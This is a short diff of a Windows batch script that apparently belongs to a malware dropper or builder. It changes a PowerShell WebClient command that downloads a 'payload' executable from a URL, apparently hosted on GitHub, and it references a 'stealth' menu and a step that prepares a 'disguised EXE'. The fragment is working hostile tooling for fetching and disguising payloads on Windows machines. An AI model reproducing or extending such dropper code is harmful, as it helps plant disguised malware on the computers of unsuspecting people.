@@ -160,9 +160,7 @@ timeout /t 1 >nul
 echo STEP 2: Connecting to GitHub...
 timeout /t 1 >nul
 echo STEP 3: Downloading payload (CAXVN.exe)...
-powershell -Command ^
-    "$client = New-Object System.Net.WebClient; ^
-    $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
+powershell -Command "$client = New-Object System.Net.WebClient; $client.DownloadFile('%EXE_URL%', '%SETUP_EXE%')"
 
 if exist "%SETUP_EXE%" (
     echo Download successful.
@@ -173,6 +171,7 @@ if exist "%SETUP_EXE%" (
 )
 pause
 goto STEALTH_MENU
+
 
 :RUN
 echo Preparing disguised EXE...
